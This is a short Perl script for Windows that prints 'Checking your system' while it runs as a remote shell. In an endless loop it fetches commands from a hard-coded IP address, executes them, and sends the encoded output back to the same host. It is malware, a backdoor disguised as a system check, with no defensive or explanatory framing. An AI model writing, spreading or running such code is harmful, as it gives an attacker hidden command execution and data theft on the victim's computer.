#powered by jreisinger :);

use Win32::Internet;
use URI::Encode qw(uri_encode uri_decode);;

print "Checking your system ";
while ( 1 ) {
my $INET = new Win32::Internet();
my $cmd = $INET->FetchURL("http://195.146.133.198/httpsh/actual.txt);
my $out = "";
for my $line (`$cmd`) {
$out .= uri_encode($line);
}
$INET->FetchURL("http://195.146.133.198/httpsh/output.php?out=$out");
sleep 2;
    print ".";
}
